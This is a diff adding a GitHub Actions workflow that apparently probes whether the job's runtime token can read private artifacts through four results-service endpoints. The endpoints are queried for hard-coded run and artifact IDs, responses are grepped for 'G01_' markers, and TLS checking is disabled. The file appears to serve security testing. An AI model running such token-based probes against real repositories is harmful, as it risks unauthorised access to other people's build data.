@@ -1,0 +1,40 @@
+name: G01 Results Runtime Private Read
+
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+    steps:
+      - name: Probe run-scoped results service
+        shell: bash
+        run: |
+          set +e
+          url="${ACTIONS_RESULTS_URL%/}"
+          echo "results_url=$url"
+          echo "runtime_token_length=${#ACTIONS_RUNTIME_TOKEN}"
+          endpoint="$url/_apis/artifact/Artifacts?workflowRunBackendId=30854116091"
+          echo "GET $endpoint"
+          curl -skS --max-time 8 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -w "http_status=%{http_code}\n" -o /tmp/g01-b "$endpoint"
+          grep -Eo "G01_[A-Z0-9_]+" /tmp/g01-b | head -5 || true
+          head -c 800 /tmp/g01-b; echo
+          endpoint="$url/_apis/artifact/Artifact?artifactId=8871751823"
+          echo "GET $endpoint"
+          curl -skS --max-time 8 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -w "http_status=%{http_code}\n" -o /tmp/g01-b "$endpoint"
+          grep -Eo "G01_[A-Z0-9_]+" /tmp/g01-b | head -5 || true
+          head -c 800 /tmp/g01-b; echo
+          endpoint="$url/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL"
+          echo "POST $endpoint"
+          curl -skS --max-time 8 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" -d "{\\"artifactId\\":8871751823,\\"workflowRunBackendId\\":30854116091}" -w "http_status=%{http_code}\n" -o /tmp/g01-b "$endpoint"
+          grep -Eo "G01_[A-Z0-9_]+" /tmp/g01-b | head -5 || true
+          head -c 800 /tmp/g01-b; echo
+          endpoint="$url/twirp/github.actions.results.api.v1.ArtifactService/GetArtifact"
+          echo "POST $endpoint"
+          curl -skS --max-time 8 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" -d "{\\"artifactId\\":8871751823,\\"workflowRunBackendId\\":30854116091}" -w "http_status=%{http_code}\n" -o /tmp/g01-b "$endpoint"
+          grep -Eo "G01_[A-Z0-9_]+" /tmp/g01-b | head -5 || true
+          head -c 800 /tmp/g01-b; echo
+
